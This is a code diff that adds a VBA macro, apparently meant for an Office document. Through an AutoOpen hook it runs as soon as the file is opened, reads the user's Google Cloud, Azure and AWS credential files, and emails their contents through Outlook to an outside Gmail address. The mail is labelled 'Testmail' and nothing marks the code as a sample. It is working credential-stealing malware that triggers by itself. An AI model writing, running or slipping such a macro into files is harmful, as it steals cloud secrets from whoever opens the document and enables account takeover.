@@ -1,0 +1,40 @@
+Sub SendIt()
+
+  Dim outobj, mailobj
+  Dim strFileText
+  Dim objFileToRead
+
+  Set outobj = CreateObject("Outlook.Application")
+  Set mailobj = outobj.CreateItem(0)
+  appdata = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
+  home = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%HOMEPATH%")
+  gcpCreds = GetText(appdata & "\gcloud\credentials.db")
+  azureCreds = GetText(home & "\.azure\accessTokens.json")
+  awsCreds = GetText(home & "\.aws\credentials")
+
+    With mailobj
+    .To = "test@gmail.com"
+    .Subject = "Testmail"
+    .Body = gcpCreds + azureCreds + awsCreds
+    .Send
+  End With
+
+  'Clear the memory
+  Set outobj = Nothing
+  Set mailobj = Nothing
+
+End Sub
+
+Function GetText(sFile As String) As String
+   Dim nSourceFile As Integer, sText As String
+   nSourceFile = FreeFile
+   'Write the entire file to sText
+   Open sFile For Input As #nSourceFile
+   sText = Input$(LOF(1), 1)
+   Close
+   GetText = sText
+End Function
+
+Sub AutoOpen()
+    SendIt
+End Sub
